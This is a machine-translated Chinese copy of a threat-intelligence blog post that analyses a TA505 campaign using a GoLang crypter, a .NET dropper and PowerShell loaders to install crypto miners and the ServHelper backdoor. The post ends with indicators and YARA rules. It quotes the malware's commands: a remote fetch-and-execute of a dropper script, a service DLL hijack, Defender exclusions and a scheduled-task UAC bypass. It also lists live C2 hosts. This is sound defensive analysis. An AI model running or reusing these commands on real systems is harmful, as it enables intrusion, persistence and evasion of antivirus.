<html>
<head>
<title>TA505 adds GoLang crypter for delivering miners and ServHelper</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TA505增加了传送矿工和服务助手的GoLang密码器</h1>
<blockquote>原文：<a href="https://medium.com/walmartglobaltech/ta505-adds-golang-crypter-for-delivering-miners-and-servhelper-af70b26a6e56?source=collection_archive---------0-----------------------#2021-07-06">https://medium.com/walmartglobaltech/ta505-adds-golang-crypter-for-delivering-miners-and-servhelper-af70b26a6e56?source=collection_archive---------0-----------------------#2021-07-06</a></blockquote><div><div class="ds gv gw gx gy gz"/><div class="ha hb hc hd he"><div class=""/><p id="3b6c" class="pw-post-body-paragraph ie if hh ig b ih ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb ha bi translated">作者:杰森·里维斯和约书亚·普拉特</p><figure class="jd je jf jg fd jh er es paragraph-image"><div role="button" tabindex="0" class="ji jj di jk bf jl"><div class="er es jc"><img src="../Images/450312b403c899aafe5968bfec3a3c06.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5-DrVCcuImgiLN7Fkx8ATA.jpeg"/></div></div></figure><p id="945e" class="pw-post-body-paragraph ie if hh ig b ih ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb ha bi translated">最近，我们发现了一个由许多其他组织[1，2，4]详述的活动，该活动正被利用来提供与TA505相关的恶意软件，即最近活动的ServHelper[3]。在Avira的一篇文章[4]中，他们将使用NSIS装载机的旧战役联系起来，但最近的战役已经发展到也利用包裹的GoLang密码器。NET加载程序来启动这个链。</p><h1 id="81c1" class="jo jp hh bd jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl bi translated">密码器</h1><p id="fcdf" class="pw-post-body-paragraph ie if hh ig b ih km ij ik il kn in io ip ko ir is it kp iv iw ix kq iz ja jb ha bi translated">crypter层是用GoLang编写的，旨在混淆下一层，它看起来是BASE64，但其中有其他字符。</p><figure class="jd je jf jg fd jh er es paragraph-image"><div class="er es kr"><img src="../Images/34ec7466c8173510e931c6c4cb372fe2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1046/format:webp/1*4yEH6SJYIM2Hpw5it3Yq_w.png"/></div></figure><p id="d5d2" class="pw-post-body-paragraph ie if hh ig b ih ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb ha bi translated">其他一些函数参数会让我相信它在替换字符串中的字符。</p><figure class="jd je jf jg fd jh er es paragraph-image"><div class="er es ks"><img src="../Images/d2bc3d95ca3f52c18b87f81e4996faa5.png" data-original-src="https://miro.medium.com/v2/resize:fit:760/format:webp/1*c9D5UjOul6dxV4Kh0V3thw.png"/></div></figure><p id="48dc" class="pw-post-body-paragraph ie if hh ig b ih ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb ha bi translated">我们可以通过查看字符串中是否存在“A”来进行快速检查:</p><figure class="jd je jf jg fd jh er es paragraph-image"><div class="er es kt"><img src="../Images/f462b5e3bd4b5bc94b66f2c0e5ca7d97.png" data-original-src="https://miro.medium.com/v2/resize:fit:746/format:webp/1*r4nMNJv-Dlgr0PamNzS0Mg.png"/></div></figure><p id="90a4" class="pw-post-body-paragraph ie if hh ig b ih ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb ha bi translated">具有相同密码器的另一个文件利用替换两个字节而不是一个字节:</p><figure class="jd je jf jg fd jh er es paragraph-image"><div class="er es ku"><img src="../Images/98cc6111c082da3c75ad3ab305c88f77.png" data-original-src="https://miro.medium.com/v2/resize:fit:472/format:webp/1*jEr1ia-ryXC2C87VBd9CIA.png"/></div></figure><p id="515d" class="pw-post-body-paragraph ie if hh ig b ih ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb ha bi translated">在解码这一层之后，我们剩下一个名为“Dropper 1.0.0”的. NET可执行文件，它有一些有趣的资源。</p><figure class="jd je jf jg fd jh er es paragraph-image"><div class="er es kv"><img src="../Images/ceef48d36f6d05116361eb177ba2d48d.png" data-original-src="https://miro.medium.com/v2/resize:fit:536/format:webp/1*KncVVhzFHv_4TvaUu_hvDQ.png"/></div></figure><p id="86d8" class="pw-post-body-paragraph ie if hh ig b ih ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb ha bi translated">在程序的主要组件中开始执行:</p><figure class="jd je jf jg fd jh er es paragraph-image"><div role="button" tabindex="0" class="ji jj di jk bf jl"><div class="er es kw"><img src="../Images/413e03c6c2210efcaed2533ceecbf7bd.png" data-original-src="https://miro.medium.com/v2/resize:fit:974/format:webp/1*VN6qxYfVfaqlgEvWJw-2tw.png"/></div></div></figure><p id="07fe" class="pw-post-body-paragraph ie if hh ig b ih ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb ha bi translated">然后运行“Form1”:</p><figure class="jd je jf jg fd jh er es paragraph-image"><div class="er es kx"><img src="../Images/0877483a2a2e4404ca5e751f95e3258c.png" data-original-src="https://miro.medium.com/v2/resize:fit:936/format:webp/1*keTXLkPhnnK3RkPJmZ80hw.png"/></div></figure><p id="fce5" class="pw-post-body-paragraph ie if hh ig b ih ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb ha bi translated">在“InitializeComponent”函数中，我们可以看到“Form1_Load”被设置为EventHandler，它实际上负责引爆powershell脚本资源。</p><figure class="jd je jf jg fd jh er es paragraph-image"><div role="button" tabindex="0" class="ji jj di jk bf jl"><div class="er es ky"><img src="../Images/55e3ae97bd32a5bc7afad566c83cbb3d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TSwB4tRzdun9woO8p4m3-Q.png"/></div></div></figure><p id="099c" class="pw-post-body-paragraph ie if hh ig b ih ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb ha bi translated">脚本“ready.ps1”为一些函数设置了一个类，并引发了“get-content.ps1”脚本，该脚本处理安装和设置大量可执行文件以及后门和持久性。它还可以拉入其他文件进行引爆:</p><pre class="jd je jf jg fd kz la lb lc aw ld bi"><span id="f365" class="le jp hh la b fi lf lg l lh li">$g=New-Object -ComObject Msxml2.XMLHTTP;$g.open('GET',"hxxp://88[.]119.171.253/dropper.ps1",$false);$g.send();iex $g.responseText</span></pre><p id="e1f2" class="pw-post-body-paragraph ie if hh ig b ih ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb ha bi translated">这个dropper powershell脚本包含许多层混淆，但最终导致一个脚本将为比特币和Eth安装多个矿工机器人。</p><pre class="jd je jf jg fd kz la lb lc aw ld bi"><span id="78a8" class="le jp hh la b fi lf lg l lh li">$payloadurl="http://beautyiconltd.cn/ethged.txt"<br/>$configurl="http://beautyiconltd.cn/ethcnf.txt"<br/>$hash=(New-Object Net.Webclient).downloadstring("http://beautyiconltd.cn/ethhsh.txt")</span></pre><h1 id="3dc2" class="jo jp hh bd jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl bi translated"><strong class="ak"> PowerShell加载程序</strong></h1><p id="987a" class="pw-post-body-paragraph ie if hh ig b ih km ij ik il kn in io ip ko ir is it kp iv iw ix kq iz ja jb ha bi translated">前面的Get-Content powershell文件在结构上与本文[1]中列出的文件非常相似。powershell文件将多个文件写入与RDP服务相关的磁盘，包括用于设置服务的注册表blob:</p><pre class="jd je jf jg fd kz la lb lc aw ld bi"><span id="abad" class="le jp hh la b fi lf lg l lh li">Windows Registry Editor Version 5.00</span><span id="d47a" class="le jp hh la b fi lj lg l lh li">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermService]<br/>"DependOnService"=hex(7):52,00,50,00,43,00,53,00,53,00,00,00,00,00<br/>"Description"="@%SystemRoot%\\System32\\termsrv.dll,-267"<br/>"DisplayName"="@%SystemRoot%\\System32\\termsrv.dll,-268"<br/>"ErrorControl"=dword:00000001<br/>"FailureActions"=hex:80,51,01,00,00,00,00,00,00,00,00,00,03,00,00,00,14,00,00,\<br/>  00,01,00,00,00,60,ea,00,00,01,00,00,00,60,ea,00,00,00,00,00,00,60,ea,00,00<br/>"ImagePath"=hex(2):25,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,00,6f,00,6f,00,\<br/>  74,00,25,00,5c,00,53,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,73,\<br/>  00,76,00,63,00,68,00,6f,00,73,00,74,00,2e,00,65,00,78,00,65,00,20,00,2d,00,\<br/>  6b,00,20,00,4e,00,65,00,74,00,77,00,6f,00,72,00,6b,00,53,00,65,00,72,00,76,\<br/>  00,69,00,63,00,65,00,00,00<br/>"ObjectName"="NT Authority\\NetworkService"<br/>"RequiredPrivileges"=hex(7):53,00,65,00,41,00,73,00,73,00,69,00,67,00,6e,00,50,\<br/>  00,72,00,69,00,6d,00,61,00,72,00,79,00,54,00,6f,00,6b,00,65,00,6e,00,50,00,\<br/>  72,00,69,00,76,00,69,00,6c,00,65,00,67,00,65,00,00,00,53,00,65,00,41,00,75,\<br/>  00,64,00,69,00,74,00,50,00,72,00,69,00,76,00,69,00,6c,00,65,00,67,00,65,00,\<br/>  00,00,53,00,65,00,43,00,68,00,61,00,6e,00,67,00,65,00,4e,00,6f,00,74,00,69,\<br/>  00,66,00,79,00,50,00,72,00,69,00,76,00,69,00,6c,00,65,00,67,00,65,00,00,00,\<br/>  53,00,65,00,43,00,72,00,65,00,61,00,74,00,65,00,47,00,6c,00,6f,00,62,00,61,\<br/>  00,6c,00,50,00,72,00,69,00,76,00,69,00,6c,00,65,00,67,00,65,00,00,00,53,00,\<br/>  65,00,49,00,6d,00,70,00,65,00,72,00,73,00,6f,00,6e,00,61,00,74,00,65,00,50,\<br/>  00,72,00,69,00,76,00,69,00,6c,00,65,00,67,00,65,00,00,00,53,00,65,00,49,00,\<br/>  6e,00,63,00,72,00,65,00,61,00,73,00,65,00,51,00,75,00,6f,00,74,00,61,00,50,\<br/>  00,72,00,69,00,76,00,69,00,6c,00,65,00,67,00,65,00,00,00,00,00<br/>"ServiceSidType"=dword:00000001<br/>"Start"=dword:00000003<br/>"Type"=dword:00000020</span><span id="53d5" class="le jp hh la b fi lj lg l lh li">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermService\Parameters]<br/>"ServiceDll"=hex(2):25,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,00,6f,00,6f,\<br/>  00,74,00,25,00,5c,00,53,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,\<br/>  74,00,65,00,72,00,6d,00,73,00,72,00,76,00,2e,00,64,00,6c,00,6c,00,00,00<br/>"ServiceDllUnloadOnStop"=dword:00000001</span><span id="d96e" class="le jp hh la b fi lj lg l lh li">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermService\Performance]<br/>"Close"="CloseTSObject"<br/>"Collect"="CollectTSObjectData"<br/>"Collect Timeout"=dword:000003e8<br/>"Library"="C:\\Windows\\System32\\perfts.dll"<br/>"Open"="OpenTSObject"<br/>"Open Timeout"=dword:000003e8<br/>"InstallType"=dword:00000001<br/>"PerfIniFile"="tslabels.ini"<br/>"First Counter"=dword:0000238c<br/>"Last Counter"=dword:0000238c<br/>"First Help"=dword:0000238d<br/>"Last Help"=dword:0000238d<br/>"Object List"="9100"</span></pre><p id="279d" class="pw-post-body-paragraph ie if hh ig b ih ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb ha bi translated">为此注册表blob列出的ServiceDll是:</p><pre class="jd je jf jg fd kz la lb lc aw ld bi"><span id="39de" class="le jp hh la b fi lf lg l lh li">%SystemRoot%\\System32\\termsrv.dll\x00</span></pre><p id="2004" class="pw-post-body-paragraph ie if hh ig b ih ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb ha bi translated">然而，在安装了这个新服务之后，它就停止了，因此这看起来是为简单地建立占位符服务而设计的:</p><pre class="jd je jf jg fd kz la lb lc aw ld bi"><span id="a7f8" class="le jp hh la b fi lf lg l lh li">}<br/>write-host kill<br/>set-service TermService -StartupType Disabled<br/>$tspid=(get-wmiobject win32_service | where { $_.name -eq 'TermService'}).processID<br/>Stop-Process -Id $tspid -Force</span><span id="d206" class="le jp hh la b fi lj lg l lh li">ew-Service -Name "termservice" -BinaryPathName "C:\WINDOWS\System32\svchost.exe -k networkservice"<br/> reg import $env:temp\rpds.reg</span><span id="3813" class="le jp hh la b fi lj lg l lh li">}<br/>write-host kill<br/>set-service TermService -StartupType Disabled<br/>$tspid=(get-wmiobject win32_service | where { $_.name -eq 'TermService'}).processID<br/>Stop-Process -Id $tspid -Force</span></pre><p id="aa0f" class="pw-post-body-paragraph ie if hh ig b ih ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb ha bi translated">写入磁盘的大多数文件都与RDPWrap所需的文件相关，但有两个文件似乎与RDPWrap无关，它们也是UPX打包的。这些文件作为硬编码文件写入磁盘。</p><pre class="jd je jf jg fd kz la lb lc aw ld bi"><span id="927a" class="le jp hh la b fi lf lg l lh li">$fldr=$env:systemroot+"\branding\"<br/>$bf="mediasvc.png"<br/>$rf="mediasrv.png"<br/>$cf="wupsvc.jpg"</span></pre><p id="2fd7" class="pw-post-body-paragraph ie if hh ig b ih ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb ha bi translated">其中一个文件将被设置为前面提到的占位符服务的新ServiceDLL值:</p><pre class="jd je jf jg fd kz la lb lc aw ld bi"><span id="f079" class="le jp hh la b fi lf lg l lh li">reg add "HKLM\system\currentcontrolset\services\TermService\parameters" /v ServiceDLL /t REG_EXPAND_SZ /d $fldr$rf /f</span></pre><h1 id="2625" class="jo jp hh bd jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl bi translated">有效载荷</h1><p id="807f" class="pw-post-body-paragraph ie if hh ig b ih km ij ik il kn in io ip ko ir is it kp iv iw ix kq iz ja jb ha bi translated">该文件自称为“Helper ”,它包含编码字符串:</p><figure class="jd je jf jg fd jh er es paragraph-image"><div class="er es lk"><img src="../Images/18c0e4fa0bc388506a9c94f485492d78.png" data-original-src="https://miro.medium.com/v2/resize:fit:1040/format:webp/1*2zC2G51nRRdl3Oysx-76oQ.png"/></div></figure><p id="6bf6" class="pw-post-body-paragraph ie if hh ig b ih ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb ha bi translated">创建一个快速的字符串解码器可以让我们快速转储字符串，并看到该文件是为访问另外两个文件而设计的，一个是DLL文件，另一个是RDPWrap配置文件，同时还可以收集关于它所在系统的一些信息。</p><pre class="jd je jf jg fd kz la lb lc aw ld bi"><span id="a746" class="le jp hh la b fi lf lg l lh li">SLIn<br/>wupsvc.jpg<br/>wupsvc.jpg<br/>termsrv.dll<br/>ServiceMain<br/>termsrv.dll<br/>Main<br/>slc.dll<br/>Main<br/>slc.dll<br/>%d.%d.%d.%d<br/>New_Win8SLE<br/>New_Win8SLE<br/>SLInitHook.x64A<br/>SLInitFunc.x64A<br/>asfjiau4hghas<br/>ows\branding<br/>\mediasvc.png<br/>             _<br/>vsdlskdngsj<br/>vsdlskdngsj<br/>SLGetWindowsInformationDWORD</span></pre><p id="59bf" class="pw-post-body-paragraph ie if hh ig b ih ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb ha bi translated">写入磁盘的另一个DLL也是UPX打包的，它是我们最感兴趣的，这是ServHelper[3]的隧道变体，在BinaryDefense[2]的博客文章中有详细描述。这篇博文非常全面，与我们在示例中看到的ServHelper相关配置数据非常吻合:</p><pre class="jd je jf jg fd kz la lb lc aw ld bi"><span id="e734" class="le jp hh la b fi lf lg l lh li">{'C2': ['asdjausg.cn', 'potuybze.xyz', 'asfuuvhv3083f.xyz', 'http://bromide.xyz/ssh.zip', 'http://sdsddgu.xyz/khkhkt'], 'PIPES': ['\\\\.\\pipe\\txtpipe', '\\\\.\\pipe\\anspipe'], 'URI': ['/ipa/b.php']}</span></pre><h1 id="b728" class="jo jp hh bd jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl bi translated"><strong class="ak">结论</strong></h1><p id="4e06" class="pw-post-body-paragraph ie if hh ig b ih km ij ik il kn in io ip ko ir is it kp iv iw ix kq iz ja jb ha bi translated">一个有趣的圆，从发现一个GoLang地穴开始。NET loader用于删除矿工机器人，也用于提供服务助手。</p><h1 id="5474" class="jo jp hh bd jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl bi translated"><strong class="ak"> IOCs </strong></h1><p id="a7fa" class="pw-post-body-paragraph ie if hh ig b ih km ij ik il kn in io ip ko ir is it kp iv iw ix kq iz ja jb ha bi translated">GoLang加密文件:</p><pre class="jd je jf jg fd kz la lb lc aw ld bi"><span id="6f0e" class="le jp hh la b fi lf lg l lh li">b591e73c3ebfe7ba44eb161c3cc1ee7b9a794d4e9b9b9aa4e3936f518e814ceb<br/>6eca26fcfabbb12c6a37eb689de222e75b31574dd25e7fd3d8b446d700c40133</span></pre><p id="9c2c" class="pw-post-body-paragraph ie if hh ig b ih ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb ha bi translated">ServHelper配置:</p><pre class="jd je jf jg fd kz la lb lc aw ld bi"><span id="c636" class="le jp hh la b fi lf lg l lh li">{'C2': ['hopeithelps.xyz', 'adsgjuhsdgubhu4.xyz', 'zbuurhbbc.cn', 'http://bromide.xyz/ssh.zip', 'http://sdsddgu.xyz/khkhkt'], 'PIPES': ['\\\\.\\pipe\\txtpipe', '\\\\.\\pipe\\anspipe'], 'URI': ['/ipa/b.php']}</span><span id="27b1" class="le jp hh la b fi lj lg l lh li">{'C2': ['asdjausg.cn', 'potuybze.xyz', 'asfuuvhv3083f.xyz', 'http://bromide.xyz/ssh.zip', 'http://sdsddgu.xyz/khkhkt'], 'PIPES': ['\\\\.\\pipe\\txtpipe', '\\\\.\\pipe\\anspipe'], 'URI': ['/ipa/b.php']}</span><span id="36ec" class="le jp hh la b fi lj lg l lh li">{'C2': ['afditnzurh.xyz', 'kbpsorjbus6.pw', 'aspdivhvy7a.cn', 'http://bromide.xyz/ssh.zip', 'http://sdsddgu.xyz/khkhkt'], 'PIPES': ['\\\\.\\pipe\\txtpipe', '\\\\.\\pipe\\anspipe'], 'URI': ['/moist/b.php']}</span><span id="b8d4" class="le jp hh la b fi lj lg l lh li">{'C2': ['asdjausg.cn', 'potuybze.xyz', 'asfuuvhv3083f.xyz', 'http://bromide.xyz/ssh.zip', 'http://sdsddgu.xyz/khkhkt'], 'PIPES': ['\\\\.\\pipe\\txtpipe', '\\\\.\\pipe\\anspipe'], 'URI': ['/ipa/b.php']}</span><span id="fe46" class="le jp hh la b fi lj lg l lh li">{'C2': ['askduvjuz.xyz', 'pasobjub.xyz', 'pasgugbz3u4a.cn', 'http://bromide.xyz/ssh.zip', 'http://sdsddgu.xyz/khkhkt'], 'PIPES': ['\\\\.\\pipe\\txtpipe', '\\\\.\\pipe\\anspipe'], 'URI': ['/oiggb/b.php']}</span><span id="51b4" class="le jp hh la b fi lj lg l lh li">{'C2': ['askduvjuz.xyz', 'pvobijrrvvz.xyz', 'pafsovbhyda.cn', 'http://bromide.xyz/ssh.zip', 'http://sdsddgu.xyz/khkhkt'], 'PIPES': ['\\\\.\\pipe\\txtpipe', '\\\\.\\pipe\\anspipe'], 'URI': ['/arefgw/b.php']}</span><span id="fe1e" class="le jp hh la b fi lj lg l lh li">{'C2': ['askduvjuz.xyz', 'soduvhyuvz.xyz', 'pafsovbhyda.cn', 'http://bromide.xyz/ssh.zip', 'http://sdsddgu.xyz/khkhkt'], 'PIPES': ['\\\\.\\pipe\\txtpipe', '\\\\.\\pipe\\anspipe'], 'URI': ['/zpsiig/b.php']}</span><span id="24a9" class="le jp hh la b fi lj lg l lh li">{'C2': ['dsfamsi4b.cn', 'asfjjasguasus.xyz', 'pssoduvnzud.xyz', 'http://bromide.xyz/ssh.zip', 'http://sdsddgu.xyz/khkhkt'], 'PIPES': ['\\\\.\\pipe\\txtpipe', '\\\\.\\pipe\\anspipe'], 'URI': ['/jndury/b.php']}</span><span id="f4e0" class="le jp hh la b fi lj lg l lh li">{'C2': ['hitnaiguat.xyz', 'whereihjeu3.xyz', 'sagiai3agar.cn', 'http://bromide.xyz/ssh.zip', 'http://sdsddgu.xyz/khkhkt'], 'PIPES': ['\\\\.\\pipe\\txtpipe', '\\\\.\\pipe\\anspipe'], 'URI': ['/ctp/b.php']}</span><span id="0ca1" class="le jp hh la b fi lj lg l lh li">{'C2': ['homate.xyz', 'psdgiigjsjavy3.xyz', 'microkgww2.cn', 'http://bromide.xyz/ssh.zip', 'http://sdsddgu.xyz/khkhkt'], 'PIPES': ['\\\\.\\pipe\\txtpipe', '\\\\.\\pipe\\anspipe'], 'URI': ['/resist/b.php']}</span><span id="be76" class="le jp hh la b fi lj lg l lh li">{'C2': ['protosaur.xyz', 'gaiter12fa.xyz', 'dooter41ag.cn', 'http://bromide.xyz/ssh.zip', 'http://sdsddgu.xyz/khkhkt'], 'PIPES': ['\\\\.\\pipe\\txtpipe', '\\\\.\\pipe\\anspipe'], 'URI': ['/cerat/b.php']}</span><span id="8a9a" class="le jp hh la b fi lj lg l lh li">{'C2': ['wheredoyougo.cn', 'afggaiir3a.xyz', 'gigiuuruyahv.cn', 'http://bromide.xyz/ssh.zip', 'http://sdsddgu.xyz/khkhkt'], 'PIPES': ['\\\\.\\pipe\\txtpipe', '\\\\.\\pipe\\anspipe'], 'URI': ['/seger/b.php']}</span><span id="b2ee" class="le jp hh la b fi lj lg l lh li">{'C2': ['zalerha7315.xyz', 'agutagndie.cn', 'gpogjbuehuvh.xyz', 'http://bromide.xyz/ssh.zip', 'http://sdsddgu.xyz/khkhkt'], 'PIPES': ['\\\\.\\pipe\\txtpipe', '\\\\.\\pipe\\anspipe'], 'URI': ['/imp/b.php']}</span></pre><p id="adc9" class="pw-post-body-paragraph ie if hh ig b ih ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb ha bi translated">PowerShell加载程序辅助程序:</p><pre class="jd je jf jg fd kz la lb lc aw ld bi"><span id="af92" class="le jp hh la b fi lf lg l lh li">http://45.61.136.223/get/arch.php<br/>http://45.61.136.223/get/getter.php<br/>http://45.61.136.223/get/grep.php<br/>http://45.61.136.223/get/m5.php<br/>http://88.119.171.253/dropper.ps1</span></pre><p id="b537" class="pw-post-body-paragraph ie if hh ig b ih ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb ha bi translated">终点指标:</p><pre class="jd je jf jg fd kz la lb lc aw ld bi"><span id="7c31" class="le jp hh la b fi lf lg l lh li">schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null</span><span id="1134" class="le jp hh la b fi lj lg l lh li">reg add "HKLM\system\currentcontrolset\services\TermService\parameters" /v ServiceDLL</span><span id="70e4" class="le jp hh la b fi lj lg l lh li">$env:username | out-file c:\windows\temp\usrnm.txt</span><span id="b722" class="le jp hh la b fi lj lg l lh li">takeown.exe /A /F rfxvmt.dll</span><span id="3180" class="le jp hh la b fi lj lg l lh li">icacls.exe rfxvmt.dll /inheritance:d<br/>icacls.exe rfxvmt.dll /setowner "NT SERVICE\TrustedInstaller"<br/>icacls.exe rfxvmt.dll /grant "NT SERVICE\TrustedInstaller:F"</span><span id="2170" class="le jp hh la b fi lj lg l lh li">icacls.exe rfxvmt.dll /remove "NT AUTHORITY\SYSTEM"<br/>icacls.exe rfxvmt.dll /grant "NT AUTHORITY\SYSTEM:RX"<br/>#<br/>icacls.exe rfxvmt.dll /remove "BUILTIN\Administrators"<br/>icacls.exe rfxvmt.dll /grant "BUILTIN\Administrators:RX"</span><span id="821d" class="le jp hh la b fi lj lg l lh li">write-host inst<br/>$Job = Start-Job -ScriptBlock {Add-MpPreference -ExclusionPath "C:\windows\branding\*"}<br/>$Job | Wait-Job -Timeout 15<br/>$Job | Stop-Job<br/>$Job =Start-Job -ScriptBlock {Add-MpPreference -ExclusionPath "C:\users\wgautilacc\desktop\*" -force}<br/>$Job | Wait-Job -Timeout 15<br/>$Job | Stop-Job<br/>$Job =Start-Job -ScriptBlock {Add-MpPreference -ExclusionPath "C:\users\mirrors\desktop\*"}<br/>$Job | Wait-Job -Timeout 15<br/>$Job | Stop-Job<br/>#Add-MpPreference -ExclusionPath "C:\windows\branding\*"<br/>#Add-MpPreference -ExclusionPath "C:\users\wgautilacc\desktop\*" -force<br/>#Add-MpPreference -ExclusionPath "C:\users\mirrors\desktop\*"</span></pre><p id="0a76" class="pw-post-body-paragraph ie if hh ig b ih ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb ha bi translated">YARA:</p><pre class="jd je jf jg fd kz la lb lc aw ld bi"><span id="9c81" class="le jp hh la b fi lf lg l lh li">rule unpacked_servhelper<br/>{<br/>    meta:<br/>        author = "Jason Reaves"<br/>    strings:<br/>        $string_1 = {48 8d 15 ?? ?? 00 00 4c 8d 05 ?? ?? 00 00 41 b9 ?? ?? ?? 00 e8}<br/> $val = "SELECT Name FROM Win32_Group where SID=" wide<br/>    condition:<br/>        uint16(0) == 0x5A4D and all of them<br/>}</span><span id="b0f2" class="le jp hh la b fi lj lg l lh li">rule unpacked_helper<br/>{<br/>meta:<br/> author = "Jason Reaves"<br/> sample1 = "620c009cd021b02d789a8a084e03a17a95b1606950d1db9dcbced29dadc0e1dc"<br/> sample2 = "0b53130e094f715b729af44cdfbcd7c81ed37d71528c31e2a03fd2d5c3adfe0e"<br/>strings:<br/>$a1 = "Copyright (C) Helper 20" wide<br/>$s_decode = {8b c2 48 8d 4c 24 ?? 48 03 c8 8d 42 ?? 30 01 ff c2 8b 44 24 ?? 3b d0 72 e7}<br/>condition:<br/>all of them<br/>}</span></pre><h1 id="2c32" class="jo jp hh bd jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl bi translated">参考</h1><p id="fe7f" class="pw-post-body-paragraph ie if hh ig b ih km ij ik il kn in io ip ko ir is it kp iv iw ix kq iz ja jb ha bi translated">1:【https://suid.ch/research/Telegram_Malware_Analysis.html】T4</p><p id="9d4f" class="pw-post-body-paragraph ie if hh ig b ih ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb ha bi translated">2:<a class="ae ll" href="https://www.binarydefense.com/an-updated-servhelper-tunnel-variant/" rel="noopener ugc nofollow" target="_blank">https://www . binary defense . com/an-updated-serv helper-tunnel-variant/</a></p><p id="b05f" class="pw-post-body-paragraph ie if hh ig b ih ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb ha bi translated">3:<a class="ae ll" href="https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505" rel="noopener ugc nofollow" target="_blank">https://www . proof point . com/us/threat-insight/post/serv helper-and-flawedgrace-new-malware-introduced-ta 505</a></p><p id="7560" class="pw-post-body-paragraph ie if hh ig b ih ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb ha bi translated">4:<a class="ae ll" href="https://www.avira.com/en/blog/ta505-apt-group-targets-americas" rel="noopener ugc nofollow" target="_blank">https://www . avira . com/en/blog/ta 505-apt-group-targets-Americas</a></p></div></div>    
</body>
</html>